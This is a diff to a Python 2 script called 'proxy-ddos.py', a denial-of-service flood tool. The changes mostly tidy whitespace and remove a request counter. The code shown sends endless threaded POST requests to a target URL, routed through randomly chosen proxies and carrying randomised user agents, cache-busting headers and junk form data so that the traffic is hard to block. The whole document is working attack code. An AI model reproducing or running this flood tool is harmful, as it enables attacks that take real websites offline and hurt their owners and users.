@@ -24,7 +24,7 @@ def inc_counter():
 def set_safe():
     global safe
     safe=1
-    
+
 # generates a user agent array
 def useragent_list():
     global headers_useragents
@@ -63,8 +63,8 @@ def usage():
     print '---------------------------------------------------'
     print 'USAGE: python proxy-ddos.py <url>'
     print '---------------------------------------------------'
- 
-def httpcall(url):   
+
+def httpcall(url):
     useragent_list()
     referer_list()
     code=0
@@ -76,7 +76,7 @@ def httpcall(url):
     #ips = F.read().split('\n')
     #F.close()
     requests = ''
-    while 1:       
+    while 1:
         headers = {
         'User-Agent':random.choice(headers_useragents),
         'Cache-Control':'no-cache',
@@ -88,29 +88,21 @@ def httpcall(url):
         }
         postdata = urllib.urlencode( {buildblock(random.randint(3,10)):buildblock(random.randint(3,10))} )
         req = urllib2.Request(url=url,data=postdata,headers=headers)
-
         index = random.randint(0,len(ips)-1)
         proxy = urllib2.ProxyHandler({'http':ips[index]})
         opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
         urllib2.install_opener(opener)
-
         try:
             urllib2.urlopen(req)
-            #print '***************'
-            inc_counter()
-            if(request_counter%10==0):
-                print request_counter
         except Exception,e:
-            #print e
-            #break
             continue
 
-#http caller thread 
+#http caller thread
 class HTTPThread(threading.Thread):
     def run(self):
         httpcall(url)
 
-#execute 
+#execute
 if len(sys.argv) < 2:
     usage()
     sys.exit()
